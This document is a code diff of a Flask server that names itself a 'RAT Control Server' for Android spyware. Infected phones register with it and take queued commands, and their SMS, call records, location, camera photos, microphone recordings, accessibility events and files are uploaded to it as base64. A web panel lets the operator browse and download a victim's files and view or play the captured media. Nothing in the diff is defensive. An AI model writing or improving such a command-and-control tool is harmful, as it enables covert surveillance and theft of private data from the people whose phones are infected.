@@ -8,33 +8,49 @@ import base64
 
 app = Flask(__name__)
 
-# ---- Storage ----
-log_entries = []
+# ---- Persistent Storage ----
+DATA_FILE = '/tmp/rat_data.json'
+
+def load_data():
+    try:
+        with open(DATA_FILE) as f:
+            return json.load(f)
+    except:
+        return {'events': [], 'devices': {}}
+
+def save_data(events, devices):
+    with open(DATA_FILE, 'w') as f:
+        json.dump({'events': events, 'devices': devices}, f, indent=2)
+
+# Load existing data
+saved = load_data()
+log_entries = saved.get('events', [])
+devices = saved.get('devices', {})
 command_queue = []
 command_results = {}
-devices = {}
-file_cache = {}  # Store base64 files temporarily: {cmd_id: {filename, base64_data, mime_type}}
+file_cache = {}
 
-try:
-    with open('/tmp/rat_data.json') as f:
-        saved = json.load(f)
-        log_entries = saved.get('events', [])
-        devices = saved.get('devices', {})
-except:
-    pass
-
-def save_to_disk():
-    with open('/tmp/rat_data.json', 'w') as f:
-        json.dump({'events': log_entries, 'devices': devices}, f, indent=2)
+print(f"[*] Loaded {len(devices)} devices and {len(log_entries)} events from disk")
 
 def cleanup_stale_devices():
     while True:
         time.sleep(60)
-        now = datetime.now().isoformat()
-        stale = [d for d, info in devices.items() 
-                 if (datetime.now() - datetime.fromisoformat(info.get('last_seen', now))).seconds > 300]
+        now = datetime.now()
+        stale = []
+        for d, info in devices.items():
+            last_seen = info.get('last_seen', '')
+            if last_seen:
+                try:
+                    last = datetime.fromisoformat(last_seen)
+                    if (now - last).seconds > 300:
+                        stale.append(d)
+                except:
+                    stale.append(d)
         for d in stale:
-            del devices[d]
+            print(f"[*] Device {d} went offline")
+            devices[d]['online'] = False
+        if stale:
+            save_data(log_entries, devices)
 
 threading.Thread(target=cleanup_stale_devices, daemon=True).start()
 
@@ -46,36 +62,65 @@ threading.Thread(target=cleanup_stale_devices, daemon=True).start()
 def register_device():
     data = request.get_json()
     device_id = data.get('device_id', 'unknown')
+    
+    # Create or update device entry
     devices[device_id] = {
         'device_id': device_id,
         'model': data.get('model', 'Unknown'),
         'android_version': data.get('android_version', 'Unknown'),
-        'first_seen': datetime.now().isoformat(),
+        'first_seen': devices.get(device_id, {}).get('first_seen', datetime.now().isoformat()),
         'last_seen': datetime.now().isoformat(),
         'ip': request.remote_addr,
         'online': True,
     }
-    save_to_disk()
-    return jsonify({'status': 'ok', 'device_id': device_id})
+    
+    save_data(log_entries, devices)
+    print(f"[+] Device registered: {device_id} ({data.get('model')}) - Total devices: {len(devices)}")
+    return jsonify({'status': 'ok', 'device_id': device_id, 'total_devices': len(devices)})
 
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
     data = request.get_json()
     device_id = data.get('device_id', 'unknown')
+    
     if device_id in devices:
         devices[device_id]['last_seen'] = datetime.now().isoformat()
         devices[device_id]['online'] = True
         devices[device_id]['ip'] = request.remote_addr
-    save_to_disk()
+    else:
+        # Device not registered yet — auto-register
+        devices[device_id] = {
+            'device_id': device_id,
+            'model': 'Unknown (auto-registered)',
+            'android_version': 'Unknown',
+            'first_seen': datetime.now().isoformat(),
+            'last_seen': datetime.now().isoformat(),
+            'ip': request.remote_addr,
+            'online': True,
+        }
+    
+    save_data(log_entries, devices)
     return jsonify({'status': 'ok'})
 
 @app.route('/api/cmd', methods=['GET'])
 def get_commands():
     device_id = request.args.get('device_id', 'unknown')
     
+    # Update device heartbeat
     if device_id in devices:
         devices[device_id]['last_seen'] = datetime.now().isoformat()
         devices[device_id]['online'] = True
+    else:
+        # Auto-register if not seen before
+        devices[device_id] = {
+            'device_id': device_id,
+            'model': 'Unknown',
+            'android_version': 'Unknown',
+            'first_seen': datetime.now().isoformat(),
+            'last_seen': datetime.now().isoformat(),
+            'ip': request.remote_addr,
+            'online': True,
+        }
     
     cmds = []
     remaining = []
@@ -99,7 +144,6 @@ def post_result():
     cmd_id = data.get('cmd_id', 'unknown')
     data['server_received_at'] = datetime.now().isoformat()
     
-    # Store file data if base64 is included
     result_data = data.get('result', {})
     if isinstance(result_data, dict):
         if 'base64_data' in result_data and result_data['base64_data']:
@@ -109,7 +153,6 @@ def post_result():
                 'mime_type': result_data.get('mime_type', 'application/octet-stream'),
                 'file_size': result_data.get('file_size', 0),
             }
-            # Remove base64 from stored result to save memory (keep in file_cache)
             result_data['_has_file'] = True
             result_data.pop('base64_data', None)
     
@@ -124,7 +167,7 @@ def post_result():
     if len(log_entries) > 2000:
         log_entries.pop(0)
     
-    save_to_disk()
+    save_data(log_entries, devices)
     return jsonify({'status': 'ok'})
 
 @app.route('/api/log', methods=['POST'])
@@ -137,7 +180,7 @@ def post_log():
         if len(log_entries) > 2000:
             log_entries.pop(0)
         
-        save_to_disk()
+        save_data(log_entries, devices)
         return jsonify({'status': 'ok', 'total_events': len(log_entries)})
     except Exception as e:
         return jsonify({'error': str(e)}), 400
@@ -156,7 +199,6 @@ def get_logs():
 
 @app.route('/api/file/<cmd_id>', methods=['GET'])
 def get_file(cmd_id):
-    """Serve a file as base64 or raw download."""
     file_info = file_cache.get(cmd_id)
     if not file_info:
         return jsonify({'error': 'File not found or expired'}), 404
@@ -164,7 +206,6 @@ def get_file(cmd_id):
     mode = request.args.get('mode', 'base64')
     
     if mode == 'raw':
-        # Return raw bytes for download
         try:
             raw_data = base64.b64decode(file_info['base64_data'])
             from flask import Response
@@ -178,7 +219,6 @@ def get_file(cmd_id):
         except:
             return jsonify({'error': 'Invalid base64 data'}), 400
     
-    # Return base64 with metadata
     return jsonify({
         'cmd_id': cmd_id,
         'filename': file_info['filename'],
@@ -193,7 +233,10 @@ def get_file(cmd_id):
 
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
-    return jsonify({'devices': list(devices.values())})
+    device_list = list(devices.values())
+    online_count = sum(1 for d in device_list if d.get('online'))
+    print(f"[*] /api/devices: {len(device_list)} total, {online_count} online")
+    return jsonify({'devices': device_list, 'total': len(device_list), 'online': online_count})
 
 @app.route('/api/send_cmd', methods=['POST'])
 def send_command():
@@ -210,9 +253,7 @@ def send_command():
     }
     
     command_queue.append(command)
-    save_to_disk()
-    
-    return jsonify({'status': 'ok', 'cmd_id': cmd_id, 'message': f'Command queued for {data.get("target_device", "all devices")}'})
+    return jsonify({'status': 'ok', 'cmd_id': cmd_id, 'message': f'Command queued'})
 
 @app.route('/api/result/<cmd_id>', methods=['GET'])
 def get_result(cmd_id):
@@ -223,37 +264,29 @@ def get_result(cmd_id):
         if isinstance(result_data, dict):
             has_file = result_data.get('_has_file', False)
         return jsonify({'found': True, 'result': result, 'has_file': has_file})
-    return jsonify({'found': False, 'message': 'Result not yet available'})
+    return jsonify({'found': False, 'message': 'Waiting...'})
 
 @app.route('/api/stats', methods=['GET'])
 def get_stats():
     stats = {}
     for event in log_entries:
         event_type = event.get('type', 'unknown')
-        if 'sms' in event_type.lower():
-            cat = 'sms'
-        elif 'call' in event_type.lower():
-            cat = 'call'
-        elif 'location' in event_type.lower():
-            cat = 'location'
-        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
-            cat = 'camera'
-        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
-            cat = 'audio'
-        elif 'accessibility' in event_type.lower():
-            cat = 'accessibility'
-        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
-            cat = 'file'
-        elif 'command' in event_type.lower():
-            cat = 'command'
-        else:
-            cat = 'other'
+        if 'sms' in event_type.lower(): cat = 'sms'
+        elif 'call' in event_type.lower(): cat = 'call'
+        elif 'location' in event_type.lower(): cat = 'location'
+        elif 'photo' in event_type.lower() or 'camera' in event_type.lower(): cat = 'camera'
+        elif 'audio' in event_type.lower() or 'record' in event_type.lower(): cat = 'audio'
+        elif 'accessibility' in event_type.lower(): cat = 'accessibility'
+        elif 'file' in event_type.lower() or 'scan' in event_type.lower(): cat = 'file'
+        elif 'command' in event_type.lower(): cat = 'command'
+        else: cat = 'other'
         stats[cat] = stats.get(cat, 0) + 1
     
     return jsonify({
         'total_events': len(log_entries),
         'categories': stats,
         'devices_online': sum(1 for d in devices.values() if d.get('online')),
+        'total_devices': len(devices),
         'pending_commands': len(command_queue),
     })
 
@@ -356,20 +389,6 @@ CONTROL_PANEL_HTML = '''
         .toast.success { background: #0f0; color: #0a0a0a; }
         .toast.error { background: #f44; color: #fff; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); z-index: 999; justify-content: center; align-items: center;
-        }
-        .modal.active { display: flex; }
-        .modal-content {
-            background: #111; border: 2px solid #0f0; border-radius: 8px;
-            padding: 20px; max-width: 90%; max-height: 90%; overflow-y: auto;
-        }
-        .modal-close {
-            float: right; color: #f44; cursor: pointer; font-size: 1.2rem;
-            background: none; border: none;
-        }
     </style>
 </head>
 <body>
@@ -381,18 +400,18 @@ CONTROL_PANEL_HTML = '''
         
         <div class="status-bar">
             <span>Devices: <strong id="deviceCount">0</strong></span>
+            <span>Online: <strong id="onlineCount">0</strong></span>
             <span>Events: <strong id="eventCount">0</strong></span>
             <span>Pending: <strong id="pendingCount">0</strong></span>
-            <span id="lastUpdate">Last update: --</span>
+            <span id="lastUpdate">--</span>
             <button onclick="refreshAll()" style="background:#0f0;color:#000;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">🔄 Refresh</button>
         </div>
         
         <div class="grid">
-            <!-- LEFT PANEL -->
             <div>
                 <div class="panel">
                     <h2>📱 Devices</h2>
-                    <div id="deviceList"><p style="color:#666;">No devices connected</p></div>
+                    <div id="deviceList"><p style="color:#666;">Loading...</p></div>
                 </div>
                 
                 <div class="panel">
@@ -411,7 +430,6 @@ CONTROL_PANEL_HTML = '''
                 </div>
             </div>
             
-            <!-- RIGHT PANEL -->
             <div>
                 <div class="panel">
                     <h2>📋 Output</h2>
@@ -426,20 +444,11 @@ CONTROL_PANEL_HTML = '''
         </div>
     </div>
     
-    <!-- Modal for viewing files -->
-    <div class="modal" id="fileModal">
-        <div class="modal-content">
-            <button class="modal-close" onclick="closeModal()">✖</button>
-            <div id="modalContent"></div>
-        </div>
-    </div>
-    
     <div id="toastContainer"></div>
     
     <script>
         let selectedDevice = 'all';
         let devices = [];
-        let currentBrowsingPath = null;
         
         function toast(msg, type) {
             const container = document.getElementById('toastContainer');
@@ -461,21 +470,22 @@ CONTROL_PANEL_HTML = '''
                 const data = await res.json();
                 devices = data.devices || [];
                 renderDevices();
-                document.getElementById('deviceCount').textContent = devices.filter(d => d.online).length;
-            } catch(e) {}
+                document.getElementById('deviceCount').textContent = data.total || devices.length;
+                document.getElementById('onlineCount').textContent = data.online || devices.filter(d => d.online).length;
+            } catch(e) { console.error('Devices error:', e); }
         }
         
         function renderDevices() {
             const container = document.getElementById('deviceList');
             if (devices.length === 0) {
-                container.innerHTML = '<p style="color:#666;">No devices</p>';
+                container.innerHTML = '<p style="color:#666;">No devices connected. Install the app and grant permissions.</p>';
                 return;
             }
             container.innerHTML = devices.map(d => `
                 <div class="device-card ${d.online ? 'online' : 'offline'} ${selectedDevice === d.device_id ? 'selected' : ''}"
                      onclick="selectDevice('${d.device_id}')">
                     <strong>${d.device_id}</strong><br>
-                    ${d.model} | ${d.android_version}<br>
+                    ${d.model || 'Unknown'} | ${d.android_version || '?'}<br>
                     <span class="status-dot ${d.online ? 'online' : 'offline'}"></span>
                     ${d.online ? 'Online' : 'Offline'}
                 </div>
@@ -505,11 +515,7 @@ CONTROL_PANEL_HTML = '''
                     })
                 });
                 const data = await res.json();
-                toast('Command sent: ' + data.message, 'success');
-                
-                if (isFileBrowse) {
-                    currentBrowsingPath = params.path || '/storage/emulated/0';
-                }
+                toast('Command sent!', 'success');
                 
                 output.textContent = '⏳ Waiting for device... (Cmd: ' + data.cmd_id + ')';
                 pollResult(data.cmd_id, command);
@@ -549,7 +555,7 @@ CONTROL_PANEL_HTML = '''
         
         function renderFileBrowser(result, cmdId) {
             const output = document.getElementById('output');
-            const path = result.path || currentBrowsingPath;
+            const path = result.path || '/';
             const files = result.files || [];
             
             let html = '<div style="margin-bottom:10px;">';
@@ -563,9 +569,10 @@ CONTROL_PANEL_HTML = '''
             for (const f of files) {
                 const icon = f.isDirectory ? '📁' : '📄';
                 const cssClass = f.isDirectory ? 'folder' : 'file';
+                const escapedPath = f.path.replace(/'/g, "\\'");
                 const onclick = f.isDirectory 
-                    ? "sendCmd('scan_files', {path: '" + f.path + "'}, true)"
-                    : "sendCmd('get_file_content', {path: '" + f.path + "', filename: '" + f.name + "'})";
+                    ? "sendCmd('scan_files', {path: '" + escapedPath + "'}, true)"
+                    : "sendCmd('get_file_content', {path: '" + escapedPath + "', filename: '" + (f.name || 'file').replace(/'/g, "\\'") + "'})";
                 
                 html += `<li class="${cssClass}" onclick="${onclick}">
                     ${icon} ${f.name} 
@@ -582,28 +589,24 @@ CONTROL_PANEL_HTML = '''
         function renderPhotoResult(result, cmdId) {
             const output = document.getElementById('output');
             output.innerHTML = `
-                <div>
-                    <strong>📸 Photo Captured</strong><br>
-                    <small>Path: ${result.file_path || 'N/A'}</small><br>
-                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'image')">🖼️ View Image</button>
-                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
-                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
-                    <div id="preview_${cmdId}"></div>
-                </div>
+                <strong>📸 Photo Captured</strong><br>
+                <small>Path: ${result.file_path || 'N/A'}</small><br>
+                <button class="copy-btn" onclick="viewFile('${cmdId}', 'image')">🖼️ View Image</button>
+                <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                <div id="preview_${cmdId}"></div>
             `;
         }
         
         function renderAudioResult(result, cmdId) {
             const output = document.getElementById('output');
             output.innerHTML = `
-                <div>
-                    <strong>🎙️ Audio Recorded</strong><br>
-                    <small>Path: ${result.file_path || 'N/A'}</small><br>
-                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'audio')">▶ Play Audio</button>
-                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
-                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
-                    <div id="preview_${cmdId}"></div>
-                </div>
+                <strong>🎙️ Audio Recorded</strong><br>
+                <small>Path: ${result.file_path || 'N/A'}</small><br>
+                <button class="copy-btn" onclick="viewFile('${cmdId}', 'audio')">▶ Play Audio</button>
+                <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                <div id="preview_${cmdId}"></div>
             `;
         }
         
@@ -614,15 +617,13 @@ CONTROL_PANEL_HTML = '''
             const isAudio = mimeType.startsWith('audio/');
             
             output.innerHTML = `
-                <div>
-                    <strong>📄 File: ${result.file_name || 'N/A'}</strong><br>
-                    <small>Size: ${formatSize(result.file_size || 0)} | Type: ${mimeType}</small><br>
-                    ${isImage ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">🖼️ View</button>' : ''}
-                    ${isAudio ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">▶ Play</button>' : ''}
-                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
-                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
-                    <div id="preview_${cmdId}"></div>
-                </div>
+                <strong>📄 File: ${result.file_name || 'N/A'}</strong><br>
+                <small>Size: ${formatSize(result.file_size || 0)} | Type: ${mimeType}</small><br>
+                ${isImage ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">🖼️ View</button>' : ''}
+                ${isAudio ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">▶ Play</button>' : ''}
+                <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                <div id="preview_${cmdId}"></div>
             `;
         }
         
@@ -637,9 +638,7 @@ CONTROL_PANEL_HTML = '''
                 } else if (type === 'audio') {
                     previewDiv.innerHTML = `<audio class="audio-player" controls src="data:${data.mime_type};base64,${data.base64_data}"></audio>`;
                 }
-            } catch(e) {
-                toast('Failed to load file', 'error');
-            }
+            } catch(e) { toast('Failed to load file', 'error'); }
         }
         
         function downloadFile(cmdId) {
@@ -651,14 +650,8 @@ CONTROL_PANEL_HTML = '''
                 const res = await fetch('/api/file/' + cmdId + '?mode=base64');
                 const data = await res.json();
                 await navigator.clipboard.writeText(data.base64_data);
-                toast('✅ Base64 copied to clipboard! (' + formatSize(data.base64_data.length) + ' chars)', 'success');
-            } catch(e) {
-                toast('Failed to copy', 'error');
-            }
-        }
-        
-        function closeModal() {
-            document.getElementById('fileModal').classList.remove('active');
+                toast('✅ Base64 copied! (' + formatSize(data.base64_data.length) + ' chars)', 'success');
+            } catch(e) { toast('Failed to copy', 'error'); }
         }
         
         function getParentPath(path) {
@@ -715,4 +708,6 @@ CONTROL_PANEL_HTML = '''
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
+    print(f"[*] Starting RAT Control Server on port {port}")
+    print(f"[*] Loaded {len(devices)} devices from disk")
     app.run(host='0.0.0.0', port=port)
